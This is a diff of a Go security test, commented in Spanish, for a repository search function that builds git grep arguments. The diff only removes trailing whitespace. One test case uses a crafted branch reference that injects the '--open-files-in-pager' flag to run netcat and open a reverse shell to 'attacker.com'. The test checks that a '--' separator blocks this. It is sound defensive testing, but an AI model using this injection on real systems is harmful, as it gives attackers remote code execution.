@@ -15,7 +15,7 @@ func TestRepoSearchSecurity(t *testing.T) {
 	}
 	t.Run("Superación: Búsqueda legítima", func(t *testing.T) {
 		args := buildGrepArgs("mi_funcion", "main")
-		
+
 		// Verificamos que los argumentos son limpios
 		assert.Equal(t, "mi_funcion", args[len(args)-3])
 		assert.Equal(t, "--", args[len(args)-2])
@@ -25,18 +25,18 @@ func TestRepoSearchSecurity(t *testing.T) {
 	t.Run("Malintención: Parameter Injection (RCE)", func(t *testing.T) {
 		// Atacante inyecta un flag letal en lugar del nombre de la rama
 		maliciousRef := "--open-files-in-pager=nc -e /bin/sh attacker.com 1337"
-		
+
 		args := buildGrepArgs("texto_seguro", maliciousRef)
-		
+
 		isProtected := false
 		for i, arg := range args {
-			// El mitigador universal es forzar el final de flags usando "--" 
+			// El mitigador universal es forzar el final de flags usando "--"
 			// antes de variables controladas por el usuario.
 			if arg == "--" && i == len(args)-2 {
 				isProtected = true
 			}
 		}
-		
+
 		assert.True(t, isProtected, "Se debe forzar el final de argumentos con '--' para evitar inyección de parámetros.")
 	})
 }
